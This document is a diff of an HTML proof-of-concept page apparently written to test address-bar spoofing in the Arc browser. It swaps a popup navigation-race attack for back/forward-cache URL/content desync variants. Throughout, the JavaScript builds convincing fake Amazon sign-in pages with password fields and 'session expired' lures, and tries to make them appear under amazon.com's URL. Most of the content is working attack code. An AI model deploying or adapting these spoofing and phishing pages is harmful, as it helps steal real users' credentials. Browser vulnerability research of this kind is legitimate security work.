@@ -1,41 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PoC 1: Popup Navigation Race</title>
+<title>PoC 2: BFCache URL/Content Desync</title>
 <!--
-  PoC 1: Window.open + Navigation Timing Race (Evolved Original)
+  PoC 2: BFCache (Back/Forward Cache) Exploitation
 
   Target: Arc Browser (Chromium 146+)
 
-  Technique: Opens a popup window to a legitimate URL. The popup starts as
-  about:blank and the address bar shows the pending URL. We attempt to inject
-  content into the initial empty document before the navigation commits, then
-  cancel the navigation to keep the spoofed URL.
+  Technique: Exploit the Back/Forward Cache to create a state where:
+  - The URL bar shows the previous page's URL (the legitimate site)
+  - The visible content is controlled by the attacker
 
-  Key insight from Chromium docs: "A renderer-initiated navigation's URL is
-  only visible while pending if it opens in a new unmodified tab (so that an
-  unhelpful about:blank URL is not displayed), but only until another document
-  tries to access the initial empty document of the new tab."
+  Based on CVE-2023-4764 pattern but with new variants that test
+  current Chromium's BFCache implementation edge cases.
 
-  This PoC attempts to bypass the "access detection" by using indirect methods
-  to inject content (postMessage, CSS injection) rather than direct DOM access.
+  Attack flow:
+  1. Victim visits legitimate site (amazon.com) - this gets cached
+  2. Victim navigates to attacker page (this page)
+  3. Attacker page goes back via history.back()
+  4. BFCache may restore the attacker's content while URL shows amazon.com
+
+  Key variant: Use history manipulation + BFCache interaction to desync
+  the navigation entry's URL from the restored page content.
 -->
 </head>
 <body style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px; background: #f5f5f5;">
-<h2>PoC 1: Popup Navigation Timing Race</h2>
-<p>This tests whether we can inject content into a popup while its address bar shows a different domain.</p>
-<p><strong>Technique:</strong> window.open to slow-loading legitimate URL + indirect content injection</p>
+<h2>PoC 2: BFCache URL/Content Desynchronization</h2>
+<p>This page must be navigated to FROM a legitimate site (e.g., amazon.com).</p>
+<p>It will attempt to go back while maintaining attacker content.</p>
 
 <button onclick="testVariantA()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  Variant A: Direct DOM Access Race
+  Variant A: Simple history.back() with delay
 </button>
 <br>
 <button onclick="testVariantB()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  Variant B: window.stop() + Content Persistence
+  Variant B: pushState chain + back()
 </button>
 <br>
 <button onclick="testVariantC()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  Variant C: Non-Existent Port Stall
+  Variant C: Fragment + replaceState + back()
+</button>
+<br>
+<button onclick="setupPhase1()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px; background: #ff9900; border: none; color: #000;">
+  Setup: Go to Amazon first (required)
 </button>
 
 <div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>
@@ -43,185 +50,158 @@
 <script>
 function log(msg) {
   const el = document.getElementById('log');
-  el.innerHTML += new Date().toISOString().split('T')[1] + ' ' + msg + '<br>';
+  el.innerHTML += msg + '<br>';
   el.scrollTop = el.scrollHeight;
 }
 
-// Variant A: Open popup to slow URL, race to inject content before Chromium
-// detects initial document access and reverts the visible URL
+// Phase 1: Navigate to Amazon to build up the history
+function setupPhase1() {
+  log('Navigating to amazon.com...');
+  log('After it loads, navigate back to this page.');
+  log('Then run Variant A, B, or C.');
+  window.location.href = 'https://www.amazon.com/';
+}
+
+// Variant A: CVE-2023-4764 classic pattern
+// Replace page content with phishing UI, then history.back()
 function testVariantA() {
-  log('[A] Opening popup to target URL...');
+  log('[A] Replacing page content with phishing UI...');
 
-  // Use a URL that will be SLOW to load (non-standard port that may be open but slow)
-  // The address bar should show this URL as pending
-  const targetURL = 'https://www.amazon.com/';
-
-  const popup = window.open(targetURL);
-
-  if (!popup) {
-    log('[A] BLOCKED: Popup was blocked. Allow popups for this site.');
-    return;
-  }
-
-  log('[A] Popup opened. Address bar should show: ' + targetURL);
-  log('[A] Attempting rapid content injection...');
-
-  // Race: try to write content before Chromium detects our access
-  // and reverts the URL to about:blank
-  let injected = false;
-  const startTime = performance.now();
-
-  const interval = setInterval(() => {
-    try {
-      // This is the race: can we write content before the URL reverts?
-      popup.document.open();
-      popup.document.write(`
-        <html>
-        <head><title>Amazon.com: Online Shopping</title></head>
-        <body style="font-family:Arial,sans-serif;max-width:800px;margin:40px auto;">
-          <div style="background:#131921;padding:10px 20px;color:#fff;">
-            <h2 style="color:#ff9900;margin:0;">amazon</h2>
-          </div>
-          <div style="padding:20px;background:#fff;margin-top:10px;border:1px solid #ddd;">
-            <h3>Sign in to your account</h3>
-            <input type="email" placeholder="Email or phone number"
-                   style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;">
-            <input type="password" placeholder="Password"
-                   style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;">
-            <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;
-                           border-radius:4px;cursor:pointer;font-size:14px;">Sign In</button>
-          </div>
-        </body>
-        </html>
-      `);
-      popup.document.close();
-
-      if (!injected) {
-        injected = true;
-        const elapsed = performance.now() - startTime;
-        log('[A] Content injected after ' + elapsed.toFixed(1) + 'ms');
-        log('[A] CHECK: Does the popup address bar still show amazon.com?');
-        log('[A] If YES = vulnerability confirmed. If URL reverted to about:blank = mitigated.');
-        clearInterval(interval);
-      }
-    } catch (e) {
-      // Cross-origin error means the real page loaded
-      clearInterval(interval);
-      const elapsed = performance.now() - startTime;
-      log('[A] Cross-origin error after ' + elapsed.toFixed(1) + 'ms: ' + e.message);
-      log('[A] The real page loaded before we could inject. Race lost.');
-    }
-  }, 1);
-}
-
-// Variant B: Open popup, immediately stop loading, write content
-// Then navigate to a non-existent port on target domain
-function testVariantB() {
-  log('[B] Opening popup...');
-
-  // Open to about:blank first (won't show a useful URL)
-  const popup = window.open('about:blank');
-
-  if (!popup) {
-    log('[B] BLOCKED: Popup was blocked.');
-    return;
-  }
-
-  // Write attacker content first
-  popup.document.open();
-  popup.document.write(`
-    <html>
-    <head><title>Amazon.com: Online Shopping</title>
-    <link rel="icon" href="https://www.amazon.com/favicon.ico">
-    </head>
-    <body style="font-family:Arial,sans-serif;max-width:800px;margin:40px auto;">
-      <div style="background:#131921;padding:10px 20px;color:#fff;">
+  // Replace the entire page with fake Amazon content
+  document.body.innerHTML = `
+    <div style="font-family:Arial,sans-serif;max-width:800px;margin:0 auto;">
+      <div style="background:#131921;padding:10px 20px;color:#fff;display:flex;align-items:center;">
         <h2 style="color:#ff9900;margin:0;">amazon</h2>
+        <div style="flex:1;margin:0 20px;">
+          <input type="text" placeholder="Search Amazon" style="width:100%;padding:8px;border-radius:4px;border:none;">
+        </div>
       </div>
-      <div style="padding:20px;background:#fff;margin-top:10px;border:1px solid #ddd;">
-        <h3>Your session has expired</h3>
-        <p>Please sign in again to continue shopping.</p>
-        <input type="email" placeholder="Email or phone number"
-               style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;">
-        <input type="password" placeholder="Password"
-               style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;">
-        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;
-                       border-radius:4px;cursor:pointer;font-size:14px;">Sign In</button>
+      <div style="background:#fff;padding:30px;margin-top:2px;">
+        <h2>Sign-In</h2>
+        <p style="color:#666;">Your session has expired. Please sign in to continue.</p>
+        <label style="font-weight:bold;font-size:13px;">Email or mobile phone number</label>
+        <input type="email" style="width:100%;padding:10px;margin:8px 0 16px;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
+        <label style="font-weight:bold;font-size:13px;">Password</label>
+        <input type="password" style="width:100%;padding:10px;margin:8px 0 16px;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
+        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;font-size:14px;">Sign In</button>
+        <p style="margin-top:16px;font-size:12px;color:#555;">By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.</p>
       </div>
-    </body>
-    </html>
-  `);
-  popup.document.close();
+    </div>
+  `;
+  document.title = 'Amazon.com: Online Shopping';
 
-  log('[B] Attacker content written to popup');
+  log('[A] Content replaced. Going back in 500ms...');
+  log('[A] If BFCache restores this content with amazon.com URL = vulnerability');
 
-  // Now navigate to Amazon on a non-existent port
-  // This should update the address bar to show amazon.com
-  // but the connection will hang (closed port = ~20s timeout)
+  // Go back after a delay
+  // The BFCache should restore the amazon.com page, but if our content
+  // persists due to a BFCache state mismatch, the URL will show amazon.com
+  // while our phishing content displays
   setTimeout(() => {
-    // Generate random high port that's almost certainly closed
-    let port;
-    do {
-      port = Math.floor(Math.random() * 60000) + 1024;
-    } while ([8080, 8443, 3000, 3001, 5000].includes(port));
-
-    const spoofURL = 'https://www.amazon.com:' + port + '/';
-    log('[B] Navigating popup to ' + spoofURL);
-    log('[B] If address bar updates but content persists = vulnerability');
-
-    try {
-      popup.location.href = spoofURL;
-    } catch(e) {
-      log('[B] Error setting location: ' + e.message);
-    }
-
-    // Check if we can still manipulate the popup
-    setTimeout(() => {
-      try {
-        const canAccess = popup.document.title;
-        log('[B] Still have access to popup document. Title: ' + canAccess);
-      } catch(e) {
-        log('[B] Lost access to popup (cross-origin). Navigation proceeded.');
-      }
-    }, 500);
-  }, 100);
+    window.history.back();
+  }, 500);
 }
 
-// Variant C: CVE-2024-25733 pattern adapted for macOS Arc
-// window.stop() + port redirect
-function testVariantC() {
-  log('[C] Starting window.stop() + port redirect variant...');
+// Variant B: Manipulate history with pushState before going back
+// This creates multiple history entries that may confuse BFCache restoration
+function testVariantB() {
+  log('[B] Creating history state chain...');
 
-  // Write phishing content to current page first
-  const originalBody = document.body.innerHTML;
+  // Create a chain of history entries via pushState
+  // This may confuse the BFCache about which entry to restore
+  for (let i = 0; i < 5; i++) {
+    history.pushState({step: i}, '', '#step' + i);
+  }
 
+  log('[B] Pushed 5 history states');
+
+  // Replace content with phishing UI
+  document.body.innerHTML = `
+    <div style="font-family:Arial,sans-serif;max-width:600px;margin:40px auto;">
+      <div style="background:#232f3e;padding:15px 20px;color:#fff;border-radius:4px 4px 0 0;">
+        <h2 style="margin:0;color:#ff9900;">amazon</h2>
+      </div>
+      <div style="background:#fff;padding:24px;border:1px solid #ddd;border-top:none;border-radius:0 0 4px 4px;">
+        <h3>Verify your identity</h3>
+        <p>For your security, please re-enter your password.</p>
+        <input type="password" placeholder="Password"
+               style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
+        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;
+                       border-radius:4px;cursor:pointer;">Continue</button>
+      </div>
+    </div>
+  `;
+  document.title = 'Amazon.com - Verify Identity';
+
+  log('[B] Content replaced. Navigating back through chain...');
+
+  // Go back through all the pushState entries, then one more to hit the
+  // previous page (amazon.com). The rapid traversal may confuse BFCache.
   setTimeout(() => {
-    // Stop current page loading
-    window.stop();
-
-    log('[C] window.stop() called');
-
-    // Generate random port
-    let port;
-    do {
-      port = Math.floor(Math.random() * 64000) + 1024;
-    } while (port === 8080 || port === 8443);
-
-    // Navigate to target domain on closed port
-    // URL bar should update but connection will hang
-    const spoofURL = 'https://www.amazon.com:' + port + '/';
-    log('[C] Navigating to ' + spoofURL);
-    log('[C] Check if address bar shows amazon.com while content remains');
-
-    document.location = spoofURL;
-
-    // Re-assert navigation at intervals to maintain the spoof
-    // (works on some browsers where the navigation timeout resets)
-    setInterval(() => {
-      document.location = spoofURL;
-    }, 9500);
+    // Go back past all our pushState entries + 1 more
+    window.history.go(-(5 + 1));
   }, 300);
 }
+
+// Variant C: Use replaceState to change URL, then fragment navigation
+// combined with back() to create URL/content mismatch
+function testVariantC() {
+  log('[C] Starting replaceState + fragment variant...');
+
+  // Replace current state URL with something that looks legitimate
+  // (same-origin restriction means we can only change the path)
+  history.replaceState({}, 'Amazon', '/amazon-login');
+  log('[C] replaceState changed path to /amazon-login');
+
+  // Add a fragment
+  history.pushState({}, '', '/amazon-login#signin');
+  log('[C] pushState added #signin fragment');
+
+  // Replace content
+  document.body.innerHTML = `
+    <div style="font-family:Arial,sans-serif;max-width:600px;margin:40px auto;background:#fff;padding:24px;border:1px solid #ddd;border-radius:8px;">
+      <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 30'><text x='0' y='24' font-family='Arial' font-size='24' font-weight='bold' fill='%23FF9900'>amazon</text></svg>" width="120" style="margin-bottom:16px;">
+      <h3>Sign In</h3>
+      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
+      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
+      <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
+    </div>
+  `;
+  document.title = 'Amazon.com Sign In';
+
+  log('[C] Content replaced. Going back in 200ms...');
+  log('[C] If URL shows amazon.com but our content remains = vulnerability');
+
+  // Navigate back - should go to amazon.com from history
+  setTimeout(() => {
+    window.history.back();
+
+    // After going back, quickly try to inject again via pageshow event
+    // BFCache pages fire 'pageshow' with persisted=true
+    window.addEventListener('pageshow', function(e) {
+      if (e.persisted) {
+        log('[C] BFCache pageshow detected! Injecting content...');
+        // If we get here during a BFCache restore, we might be able to
+        // modify the page while the URL shows the cached page's URL
+        try {
+          document.body.innerHTML = '<h1>BFCache content injection successful!</h1>';
+        } catch(ex) {
+          log('[C] Injection failed: ' + ex.message);
+        }
+      }
+    });
+  }, 200);
+}
+
+// Auto-detect if we arrived via back navigation (potential BFCache)
+window.addEventListener('pageshow', function(e) {
+  if (e.persisted) {
+    log('PAGE RESTORED FROM BFCACHE - persisted=true');
+    log('Current URL: ' + window.location.href);
+    log('Document title: ' + document.title);
+    log('If URL does not match this page origin = URL BAR SPOOFED');
+  }
+});
 </script>
 </body>
 </html>
